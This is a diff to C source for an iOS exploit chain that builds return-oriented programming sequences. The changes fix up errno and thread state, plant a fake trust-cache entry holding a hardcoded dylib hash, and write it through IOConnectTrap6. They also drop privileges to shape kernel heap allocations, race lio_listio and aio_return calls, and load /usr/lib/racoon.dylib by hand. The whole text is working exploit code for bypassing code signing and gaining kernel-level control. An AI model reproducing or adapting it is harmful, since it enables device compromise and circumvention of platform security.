@@ -661,14 +661,9 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// fixup errno (comment that out if you want to debug)
 	// map the memory it uses
 	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
-	// setup a pointer to a zero value to make it skip some code and not crash
-	DEFINE_ROP_VAR("new_errno_addr",8,tmp);
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("new_errno_addr",2);
-	CALL("memcpy",offsets->errno_offset+8/*FIXME: maybe this is not the same offset on all platforms*/,0,8,0,0,0,0,0);
 
 
-#if 0
+#if 1
 
 	char * dylib_str = malloc(100);
 	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
@@ -845,6 +840,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	// setup new trustcache struct
 	// TODO: move that into a seperate file
+	// FIXME: get the hash at runtime
 	typedef char hash_t[20];
 	struct trust_chain {
 		uint64_t next;
@@ -855,17 +851,17 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 1;
-	hash_t my_dylib_hash = {0x84,0xb7,0x41,0x9a,0x1a,0x7c,0x19,0xbc,0x0f,0x12,0x98,0x63,0x33,0xd9,0x77,0x0f,0x54,0xfe,0xea,0x9c};
+	hash_t my_dylib_hash = {0x88,0xd1,0x7f,0x3e,0x27,0x42,0x76,0x09,0xaa,0xb9,0xbb,0xee,0xb1,0xfb,0x21,0x27,0x1f,0xc5,0x57,0xa3};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
 	char * dylib_str = malloc(100);
 	snprintf(dylib_str,100,"/usr/lib/racoon.dylib");
-	DEFINE_ROP_VAR("dylib_str",strlen(dylib_str)+1,dylib_str);
+	DEFINE_ROP_VAR("dylib_str",100,dylib_str);
 
 	char * wedidit_msg = malloc(1024);
 	snprintf(wedidit_msg,1024,"WE DID IT\n");
-	DEFINE_ROP_VAR("WEDIDIT",strlen(wedidit_msg)+1,wedidit_msg);
+	DEFINE_ROP_VAR("WEDIDIT",1024,wedidit_msg);
 
 	ADD_COMMENT("mach_task_self");
 	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name(offsets,"mach_task_self"),0,0,0,0,0,0,0,0);
@@ -1028,10 +1024,6 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// TODO: we can prob remove this when we chown the log to mobile or change the permissions
 	ADD_USLEEP(100);
-
-	ADD_LOOP_START("wait");
-		ADD_USLEEP(1000);
-	ADD_LOOP_END();
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
@@ -1308,6 +1300,10 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("bss_trust_chain_head_ptr",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
 
+	ADD_LOOP_START("wait");
+		ADD_USLEEP(100);
+	ADD_LOOP_END();
+
 	// ghetto dlopen
 	// get a file descriptor for that dylib
 	DEFINE_ROP_VAR("dylib_fd",8,&buf);
@@ -1376,6 +1372,13 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("racer_path",1);
 	CALL_FUNC_RET_SAVE_VAR("racer_fd",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);
 
+	// setup the thread register to fix errno
+	DEFINE_ROP_VAR("thread_ptr",0x60,tmp);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("thread_ptr",1);
+	CALL("_pthread_set_self",0,0,0,0,0,0,0,0);
+
+
 	DEFINE_ROP_VAR("aio_list",NENT * 8,tmp);
 	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
 	DEFINE_ROP_VAR("aio_buf",NENT,tmp);
@@ -1397,6 +1400,11 @@ _STRUCT_ARM_THREAD_STATE64
 			ROP_VAR_ARG_HOW_MANY(1);
 			ROP_VAR_ARG("aio_list",2);
 			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
+			ROP_VAR_ARG_HOW_MANY(1);
+			for (int x = 0; x < NENT; x++) {
+				ROP_VAR_ARG64_W_OFFSET("aio_list",1,x*8);
+				CALL("aio_return",0,0,0,0,0,0,0,0);
+			}
 		}
 
 		// set x0 
